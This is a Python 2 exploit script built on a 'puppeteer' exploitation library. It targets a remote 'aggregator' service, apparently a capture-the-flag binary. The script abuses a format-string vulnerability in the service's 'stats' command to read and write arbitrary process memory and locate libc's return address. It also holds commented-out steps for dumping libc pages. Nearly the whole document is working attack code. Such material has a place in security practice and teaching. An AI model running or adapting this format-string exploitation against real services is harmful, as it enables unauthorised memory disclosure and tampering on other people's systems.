import puppeteer as p

import logging
try:
    import standard_logging # pylint: disable=W0611
except ImportError:
    pass
logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)
logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)

class Aggravator(p.Manipulator):
    def __init__(self, host, port):
        p.Manipulator.__init__(self, p.x86)

        # some initial info from IDA
        # TODO: maybe use IDALink to get this automatically?
        self.permanent_info['main_start'] = 0x0804A9B3
        self.permanent_info['main_end'] = 0x0804A9D1
        self.permanent_info['main_stackframe_size'] = 0x24

        self.auto_connection = p.Connection(host=host, port=port).connect()
        self.c = self.auto_connection
        self.c.read_until("> ")

    @p.printf(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
    def stats_printf(self, fmt):
        self.c.send("stats " + fmt + "\n")
        self.c.read_until("kill top:\n")
        try:
            result = self.c.read_until("\n"*5, timeout=3)[:-5]
            self.c.read_until("> ", timeout=3)
        except EOFError:
            print "Program didn't finish the print"
            return ""

        print "GOT:",repr(result)
        return result

def main():
    # Create the Aggravator!
    a = Aggravator(sys.argv[1], int(sys.argv[2]))

    # And now, we can to stuff!

    # We can read the stack!
    #print "STACKZ",a.dump_stack(1000).encode('hex')

    print "Testing memory read."
    assert a.do_memory_read(0x0804A9C3, 16) == '\x00\x8B\x44\x24\x1C\x89\x04\x24\xE8\x20\xFE\xFF\xFF\xC9\xC3\x66'

    ## We can figure out where __libc_start_main is!
    lcsm = a.main_return_address(start_offset=390)
    print "main() will return to (presumably, this is in libc):",hex(lcsm)

    # interactive memory explorer!
    #a.memory_explorer(lcsm)

    # now dump it!
    #libc = a.dump_elf(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
    #print "dumped %d pages from libc" % len(libc)
    #a.dump_libc("aggregator_libc", start_offset=390)

    # We can overwrite memory with ease!
    a.do_memory_write(0x0804C344, "OK")
    assert a.do_memory_read(0x0804C344, 2) == "OK"
    a.c.send("quit\n")

    #libc_page_start = lcsm & 0xfffff000
    #libc_page_content = a.do_memory_read(libc_page_start, 0x1000)
    #open("dumped", "w").write(libc_page_content)
    #print "read out %d bytes from libc!" % len(libc_page_content)

if __name__ == '__main__':
    import sys
    main()
